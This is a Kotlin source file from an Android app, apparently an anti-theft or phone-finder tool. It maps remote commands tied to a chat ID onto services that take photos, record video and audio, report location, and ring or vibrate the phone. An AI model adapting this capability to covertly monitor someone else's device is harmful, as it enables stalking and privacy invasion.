package com.save.me

import android.content.Context
import android.util.Log

object ActionHandlers {
    fun dispatch(
        context: Context,
        type: String,
        camera: String?,
        flash: String?,
        quality: String?,
        duration: String?,
        chatId: String?
    ) {
        when (type) {
            "photo" -> {
                val cam = camera ?: "rear"
                val fl = flash == "true"
                CameraService.start(
                    context = context,
                    type = "photo",
                    camera = cam,
                    flash = fl,
                    quality = null,
                    duration = null,
                    chatId = chatId
                )
            }
            "video" -> {
                val cam = camera ?: "rear"
                val fl = flash == "true"
                val videoQuality = when (quality) {
                    "1080p" -> 1080
                    "420p" -> 420
                    else -> 720
                }
                val dur = duration?.toIntOrNull() ?: 60
                CameraService.start(
                    context = context,
                    type = "video",
                    camera = cam,
                    flash = fl,
                    quality = videoQuality,
                    duration = dur,
                    chatId = chatId
                )
            }
            "audio" -> {
                val dur = duration?.toIntOrNull() ?: 120
                AudioService.start(context, dur, chatId)
            }
            "location" -> {
                LocationService.start(context, chatId)
            }
            "ring" -> {
                ForegroundActionService.startRingAction(context, org.json.JSONObject())
            }
            "vibrate" -> {
                ForegroundActionService.startVibrateAction(context, org.json.JSONObject())
            }
            else -> Log.e("ActionHandlers", "Unknown action type: $type")
        }
    }
}